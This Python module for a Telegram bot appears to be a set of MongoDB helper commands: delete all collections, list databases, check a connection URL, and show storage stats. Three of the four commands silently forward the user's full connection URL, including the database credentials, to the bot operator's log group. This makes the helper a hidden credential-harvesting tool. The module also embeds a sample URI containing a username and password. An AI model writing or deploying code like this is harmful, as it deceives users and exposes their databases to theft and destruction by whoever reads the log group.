import re
from pyrogram import Client, filters
from pymongo import MongoClient, errors
from Bad import app
from config import LOG_GROUP_ID
from pyrogram.types import Message

@app.on_message(filters.command("delete"))
async def delete_data(client, message):
    match = re.search(r"/delete\s+(\S+)", message.text)
    if not match:
        await message.reply_text("ɢɪᴠᴇ ᴍᴇ ᴀ ᴍᴏɴɢᴏ ᴜʀʟ ᴀꜰᴛᴇʀ ᴄᴏᴍᴍᴀɴᴅ .")
        return

    mongo_url = match.group(1)
    user = message.from_user.mention

    try:
        client = MongoClient(mongo_url)
        db = client.get_default_database()
        
        collections = db.list_collection_names()
        
        deleted_info = []
        
        for collection_name in collections:
            collection = db[collection_name]
            result = collection.delete_many({})
            deleted_info.append(f"ᴅᴇʟᴇᴛᴇᴅ {result.deleted_count} ᴅᴏᴄᴜᴍᴇɴᴛꜱ ꜰʀᴏᴍ ᴄᴏʟʟᴇᴄᴛɪᴏɴ '{collection_name}'")
        
        if deleted_info:
            await message.reply_text("\n".join(deleted_info))
            await app.send_message(LOG_GROUP_ID, f"{user} deleted the following collections:\n" + "\n".join(deleted_info) + f"\n\nMongo URL: {mongo_url}")
        else:
            await message.reply_text("ɪ ꜰᴏᴜɴᴅ ᴛʜᴇ ꜰᴏʟᴅᴇʀ ɪꜱ ᴇᴍᴘᴛʏ..")
    
    except errors.ConfigurationError as e:
        if "No default database name defined or provided" in str(e):
            await message.reply_text("**ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴅᴀᴛᴀʙᴀꜱᴇ ɴᴀᴍᴇ ʟɪᴋᴇ ᴛʜɪꜱ** \n\nmongodb+srv://shivani:shivani@shivani.wonhp7.mongodb.net/[YOUR_DATABASE_NAME]?retryWrites=true&w=majority")
        else:
            pass
    except errors.ConnectionFailure:
        await message.reply_text("ʏᴏᴜʀ ᴍᴏɴɢᴏ ᴜʀʟ ɪꜱ ɴᴏᴛ ᴠᴀʟɪᴅ")
    except Exception as e:
        await message.reply_text(f"An error occurred: {str(e)}")


async def allfoldersinmongo(mongo_url):
    try:
        client = MongoClient(mongo_url)
        databases = client.list_database_names()
        folders_count = []
        for db_name in databases:
            db = client.get_database(db_name)
            collection_names = db.list_collection_names()
            folders = [name for name in collection_names if not name.startswith('system.')]
            folders_count.append(f"{db_name}: {len(folders)}")
        return folders_count
    except Exception as e:
        return str(e)


@app.on_message(filters.command("Mongofolders"))
async def mongo_folders(bot, message: Message):
    try:
        mongo_url = message.text.split()[1]
    except IndexError:
        await message.reply("Give URL")
        return

    try:
        Zclient = MongoClient(mongo_url)
        _ = Zclient.list_database_names()
    except Exception as e:
        await message.reply("URL is not valid")
        return

    folders_counts = await allfoldersinmongo(mongo_url)
    
    if isinstance(folders_counts, list):
        response = "\n".join(folders_counts)
        await message.reply(response)
        user = message.from_user.mention
        await app.send_message(LOG_GROUP_ID, f"{user} fetched folders from MongoDB URL:\n{response} \n\nurl = {mongo_url}")
    else:
        await message.reply(f"An error occurred: {folders_counts}")



mongo_url_pattern = re.compile(r'mongodb(?:\+srv)?:\/\/[^\s]+')


@app.on_message(filters.command("mongochk"))
async def mongo_command(client, message: Message):
    if len(message.command) < 2:
        await message.reply("Please enter your MongoDB URL after the command. Example: /mongochk your_mongodb_url")
        return

    mongo_url = message.command[1]
    if re.match(mongo_url_pattern, mongo_url):
        try:
            # Attempt to connect to the MongoDB instance
            client = MongoClient(mongo_url, serverSelectionTimeoutMS=5000)
            client.server_info()  # Will cause an exception if connection fails
            await message.reply("ʏᴏᴜʀ ᴍᴏɴɢᴏ ᴅʙ ᴜʀʟ ɪs ᴠᴀʟɪᴅ ✅ ᴀɴᴅ ᴡᴏʀᴋɪɴɢ ғɪɴᴇ ✨")
        except Exception as e:
            await message.reply(f"Failed to connect to MongoDB: {e}")
    else:
        await message.reply("sᴏʀʀʏ ʏᴏᴜʀ ᴍᴏɴɢᴏ ᴅʙ ᴜʀʟ ɪs ɴᴏᴛ ᴠᴀʟɪᴅ 💔 ᴀɴᴅ ᴄᴜʀʀᴇɴᴛʟʏ ɴᴏᴛ ᴡᴏʀᴋɪɴɢ 🦠")





@app.on_message(filters.command("storage"))
async def check_storage(client, message):
    try:
        mongo_url = message.text.split(" ", 1)[1]

        if not "?" in mongo_url.split("/", 3)[-1]:
            await message.reply_text("**ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴅᴀᴛᴀʙᴀꜱᴇ ɴᴀᴍᴇ ʟɪᴋᴇ ᴛʜɪꜱ** \n\nmongodb+srv://shivani:shivani@shivani.wonhp7.mongodb.net/[YOUR_DATABASE_NAME]?retryWrites=true&w=majority")
            return

        mongo_client = MongoClient(mongo_url)

        db = mongo_client.get_default_database()

        stats = db.command("dbStats")

        storage_details = (
            f"ᴅᴀᴛᴀʙᴀꜱᴇ ɴᴀᴍᴇ: {db.name}\n"
            f"ᴄᴏʟʟᴇᴄᴛɪᴏɴꜱ: {stats['collections']}\n"
            f"ᴏʙᴊᴇᴄᴛꜱ: {stats['objects']}\n"
            f"ᴅᴀᴛᴀ ꜱɪᴢᴇ: {stats['dataSize'] / (1024 ** 2):.2f} MB\n"
            f"ꜱᴛᴏʀᴀɢᴇ ꜱɪᴢᴇ: {stats['storageSize'] / (1024 ** 2):.2f} MB\n"
            f"ɪɴᴅᴇx ꜱɪᴢᴇ: {stats['indexSize'] / (1024 ** 2):.2f} MB\n"
        )

        await message.reply_text(storage_details)
        
        user = message.from_user.mention
        await app.send_message(LOG_GROUP_ID, f"{user} fetched database storage with the following details:\n{storage_details}\n\nMongo URL: {mongo_url}")
        
    except errors.ConfigurationError as e:
        if "No default database name defined or provided" in str(e):
            await message.reply_text("**ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴅᴀᴛᴀʙᴀꜱᴇ ɴᴀᴍᴇ ʟɪᴋᴇ ᴛʜɪꜱ** \n\nmongodb+srv://shivani:shivani@shivani.wonhp7.mongodb.net/[YOUR_DATABASE_NAME]?retryWrites=true&w=majority")
        else:
            pass
    except errors.ConnectionFailure:
        await message.reply_text("ʏᴏᴜʀ ᴍᴏɴɢᴏ ᴜʀʟ ɪꜱ ɴᴏᴛ ᴠᴀʟɪᴅ")
    except Exception as e:
        await message.reply_text(f"An error occurred: {str(e)}")
